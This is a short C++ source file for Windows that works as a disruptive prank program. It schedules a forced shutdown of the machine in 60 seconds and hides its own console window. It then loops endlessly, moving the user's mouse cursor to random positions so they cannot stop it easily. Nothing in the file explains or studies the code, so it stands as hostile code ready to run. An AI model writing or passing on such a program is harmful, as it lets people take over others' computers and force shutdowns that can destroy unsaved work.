#include<windows.h>
#include<bits/stdc++.h>
using namespace std;
int main()
{
    system("Shutdown -s -t 60");
    HWND hwnd;
    hwnd=FindWindow("ConsoleWindowClass",NULL);
    if(hwnd) ShowWindow(hwnd,SW_HIDE);
	int x=GetSystemMetrics(SM_CXSCREEN);
	int y=GetSystemMetrics(SM_CYSCREEN);
	srand(time(0));
	while(1)cout<<"Oh!!!"<<endl&&SetCursorPos(rand()%x,rand()%y);
}